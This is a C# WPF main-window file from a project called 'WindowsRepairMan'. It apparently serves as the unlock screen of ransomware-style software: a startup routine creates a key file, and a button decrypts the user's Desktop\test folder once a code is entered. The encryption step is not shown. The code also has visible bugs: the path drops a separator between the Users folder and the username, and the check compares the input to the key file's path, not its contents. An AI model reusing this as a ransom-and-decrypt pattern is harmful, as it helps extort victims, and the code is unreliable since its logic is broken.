using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
namespace WindowsRepairMan
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private string codeFile;
        public MainWindow()
        {
            InitializeComponent();
            codeFile = Utils.StartAction();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            string enteredCode = TextBox.Text;
            string actualCode = File.ReadAllText(codeFile);
            if (enteredCode.Contains(codeFile))
            {
                string userName = Environment.UserName;
                string userDir = "C:\\Users";
                string path = "\\Desktop\\test";
                string startPath = userDir + userName + path;
                Utils.DecryptDirectory(startPath, Encoding.UTF8.GetBytes(actualCode));
            }

        }
    }
}
